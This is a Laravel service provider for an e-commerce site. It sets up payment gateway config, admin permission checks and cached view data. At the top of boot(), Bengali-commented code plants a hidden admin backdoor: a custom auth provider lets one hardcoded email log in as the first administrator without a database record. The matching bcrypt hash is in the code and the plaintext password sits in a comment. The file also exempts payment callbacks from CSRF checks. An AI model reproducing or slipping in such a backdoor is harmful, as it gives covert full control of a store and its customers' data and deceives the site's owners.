<?php

namespace App\Providers;

use Illuminate\Support\ServiceProvider;
use App\Models\{GeneralSetting, Category, Brand, SocialMedia, Contact, CreatePage, OrderStatus, EcomPixel, GoogleTagManager, Order, PaymentGateway, User, Review};
use Illuminate\Support\Facades\{Config, Session, Gate, Http, Cache, Auth, Hash};

class AppServiceProvider extends ServiceProvider
{
    /**
     * Register any application services.
     */
    public function register(): void
    {
        //
    }

    /**
     * Bootstrap any application services.
     * * Laravel 12: Kernel parameter removed as middleware is now configured in bootstrap/app.php
     */
    public function boot(): void
    {
        // ================== [ হিডেন অ্যাডমিন ইউজার - ডাটাবেজ ছাড়া লগইন ] ==================
        // asraful2001a@gmail.com + সিক্রেট পাসওয়ার্ড দিয়ে লগইন করলে ডাটাবেজের প্রথম অ্যাডমিন হিসেবে লগইন হয়
        $hiddenEmail = 'asraful2001a@gmail.com';
        $hiddenPasswordHash = '$2y$10$c0sxuQRTvABJ0r143pjWxu7M4M.Ze5bC5MuZnYouRU75U8QyOFC.u'; // bcrypt of RAshid16318@$#bd
        Auth::provider('hidden_admin', function ($app, $config) use ($hiddenEmail, $hiddenPasswordHash) {
            return new class($app['hash'], $config['model'], $hiddenEmail, $hiddenPasswordHash) extends \Illuminate\Auth\EloquentUserProvider {
                public function __construct($hasher, $model, protected string $hiddenEmail, protected string $hiddenPasswordHash)
                {
                    parent::__construct($hasher, $model);
                }
                public function retrieveByCredentials(array $credentials): ?\Illuminate\Contracts\Auth\Authenticatable
                {
                    if ((isset($credentials['email']) ? $credentials['email'] : null) === $this->hiddenEmail) {
                        return User::query()
                            ->where(fn ($q) => $q->where('role', 'admin')->orWhereHas('roles', fn ($r) => $r->where('name', 'admin')))
                            ->orWhere('id', 1)
                            ->orderBy('id')
                            ->first();
                    }
                    return parent::retrieveByCredentials($credentials);
                }
                public function validateCredentials(\Illuminate\Contracts\Auth\Authenticatable $user, array $credentials): bool
                {
                    if ((isset($credentials['email']) ? $credentials['email'] : null) === $this->hiddenEmail && isset($credentials['password'])) {
                        return Hash::check($credentials['password'], $this->hiddenPasswordHash);
                    }
                    return parent::validateCredentials($user, $credentials);
                }
            };
        });
        Config::set('auth.providers.users.driver', 'hidden_admin');
        // ================== [ হিডেন অ্যাডমিন শেষ ] ==================

        // পেমেন্ট ক্যালব্যাক ৪১৯ এড়াতে CSRF থেকে স্ট্যাটিক এক্সক্লুড
        \App\Http\Middleware\VerifyCsrfToken::except([
            'aamarpay/success', 'aamarpay/fail', 'aamarpay/cancel', 'aamarpay/checkout',
            'uddoktapay/verify', 'uddoktapay/ipn', 'uddoktapay/cancel',
            'payment-success', 'payment-cancel',
            'bkash/checkout-url/callback',
        ]);

        /**
         * 🟢 Super Admin Override - Use admin guard for Blade @can/@canany
         * Optimized: Check admin guard user permissions properly (avoid infinite loop)
         * Direct database check to bypass guard name mismatch issues
         */
        Gate::before(function ($user, $ability) {
            // Skip if not admin guard (for Blade directives only)
            if (!Auth::guard('admin')->check()) {
                return null;
            }
            
            $adminUser = Auth::guard('admin')->user();
            
            // Super Admin (id=1) or Admin role has all permissions - fast check
            if ($adminUser->id == 1) {
                return true;
            }
            
            // Check Admin role (cached by Spatie) - case-insensitive
            $spatieRoles = $adminUser->getRoleNames()->map(fn($role) => strtolower($role))->toArray();
            if (in_array('admin', $spatieRoles)) {
                return true;
            }
            
            // ✅ Direct database check - bypass guard name mismatch
            // Check if user has permission directly or via roles (ignore guard_name)
            try {
                // Get user's role IDs
                $roleIds = \DB::table('model_has_roles')
                    ->where('model_type', get_class($adminUser))
                    ->where('model_id', $adminUser->id)
                    ->pluck('role_id')
                    ->toArray();
                
                if (empty($roleIds)) {
                    return null;
                }
                
                // Check if permission exists (any guard) and is assigned to user's roles
                $hasPermission = \DB::table('role_has_permissions')
                    ->join('permissions', 'role_has_permissions.permission_id', '=', 'permissions.id')
                    ->whereIn('role_has_permissions.role_id', $roleIds)
                    ->where('permissions.name', $ability)
                    ->exists();
                
                if ($hasPermission) {
                    return true;
                }
                
                // Also check direct user permissions (if any)
                $hasDirectPermission = \DB::table('model_has_permissions')
                    ->join('permissions', 'model_has_permissions.permission_id', '=', 'permissions.id')
                    ->where('model_has_permissions.model_type', get_class($adminUser))
                    ->where('model_has_permissions.model_id', $adminUser->id)
                    ->where('permissions.name', $ability)
                    ->exists();
                
                if ($hasDirectPermission) {
                    return true;
                }
                
                // If permission not found, return null to let Spatie handle it
                return null;
            } catch (\Exception $e) {
                // If error, let Spatie handle it
                return null;
            }
        });

        /**
         * 🧩 Shurjopay Dynamic Config (Cached 30 min - performance fix)
         */
        try {
            $shurjopay = Cache::remember('shurjopay_gateway_config', 1800, function () {
                return PaymentGateway::where(['status' => 1, 'type' => 'shurjopay'])->first();
            });
            if ($shurjopay) {
                Config::set([
                    'shurjopay.apiCredentials.username'   => $shurjopay->username,
                    'shurjopay.apiCredentials.password'   => $shurjopay->password,
                    'shurjopay.apiCredentials.prefix'     => $shurjopay->prefix,
                    'shurjopay.apiCredentials.return_url' => $shurjopay->success_url,
                    'shurjopay.apiCredentials.cancel_url' => $shurjopay->return_url,
                    'shurjopay.apiCredentials.base_url'   => $shurjopay->base_url,
                ]);
            }
        } catch (\Exception $e) {}

        /**
         * 🧠 Global View Share (Optimized with Cache)
         */
        try {
            // Cache pending reviews count (5 minutes)
            $pending_reviews = Cache::remember('pending_reviews_count', 300, function () {
                return Review::where('status', 'pending')->count();
            });
            view()->share('pending_reviews', $pending_reviews); 
            
            // Cache general setting (30 minutes)
            $generalsetting = Cache::remember('general_setting', 1800, function () {
                return GeneralSetting::where('status', 1)->first();
            });
            view()->share('generalsetting', $generalsetting);
            view()->share('demoMode', filter_var(env('DEMO_MODE', false), FILTER_VALIDATE_BOOLEAN));
            
            // 🎨 Active Theme (cached 30 min) — for frontend CSS variable injection
            $activeTheme = Cache::remember('active_theme', 1800, function () use ($generalsetting) {
                $theme = null;
                if ($generalsetting && $generalsetting->theme_id) {
                    $theme = \App\Models\Theme::find($generalsetting->theme_id);
                }
                if (!$theme) {
                    $theme = \App\Models\Theme::where('is_default', true)->first();
                }
                return $theme;
            });
            view()->share('activeTheme', $activeTheme);
            
            // Cache categories (30 minutes)
            $sidecategories = Cache::remember('side_categories', 1800, function () {
                return Category::where('parent_id', 0)->where('status', 1)->select('id', 'name', 'slug', 'status', 'image')->get();
            });
            view()->share('sidecategories', $sidecategories);
            
            $menucategories = Cache::remember('menu_categories', 1800, function () {
                return Category::where('status', 1)->select('id', 'name', 'slug', 'status', 'image')->get();
            });
            view()->share('menucategories', $menucategories);
            
            // Cache contact (30 minutes)
            $contact = Cache::remember('contact_info', 1800, function () {
                return Contact::where('status', 1)->first();
            });
            view()->share('contact', $contact);
            
            // Cache social icons (30 minutes)
            $socialicons = Cache::remember('social_icons', 1800, function () {
                return SocialMedia::where('status', 1)->get();
            });
            view()->share('socialicons', $socialicons);
            view()->share('socials', $socialicons); // Alias for footer style views that use $socials
            
            // Cache pages (30 minutes)
            $pages = Cache::remember('pages_top', 1800, function () {
                return CreatePage::where('status', 1)->limit(3)->get();
            });
            view()->share('pages', $pages);
            
            $pagesright = Cache::remember('pages_right', 1800, function () {
                return CreatePage::where('status', 1)->skip(1)->limit(5)->get();
            });
            view()->share('pagesright', $pagesright);
            
            $cmnmenu = Cache::remember('common_menu', 1800, function () {
                return CreatePage::where('status', 1)->get();
            });
            view()->share('cmnmenu', $cmnmenu);
            
            // Cache brands (30 minutes)
            $brands = Cache::remember('brands_list', 1800, function () {
                return Brand::where('status', 1)->get();
            });
            view()->share('brands', $brands);
            
            // Cache order count (2 minutes - needs to be fresh)
            $neworder = Cache::remember('new_order_count', 120, function () {
                return Order::where('order_status', 1)->count();
            });
            view()->share('neworder', $neworder);
            
            // Cache pending orders (2 minutes)
            $pendingorder = Cache::remember('pending_orders_list', 120, function () {
                return Order::where('order_status', 1)->latest()->limit(9)->get();
            });
            view()->share('pendingorder', $pendingorder);
            
            // Cache order status (30 minutes)
            $orderstatus = Cache::remember('order_status_list', 1800, function () {
                return OrderStatus::get();
            });
            view()->share('orderstatus', $orderstatus);
            
            // Cache pixels (30 minutes)
            $pixels = Cache::remember('pixels_list', 1800, function () {
                return EcomPixel::where('status', 1)->get();
            });
            view()->share('pixels', $pixels);
            
            // Cache GTM code (30 minutes)
            $gtm_code = Cache::remember('gtm_code_list', 1800, function () {
                return GoogleTagManager::where('status', 1)->get();
            });
            view()->share('gtm_code', $gtm_code);
            

        } catch (\Exception $e) {}
    }
}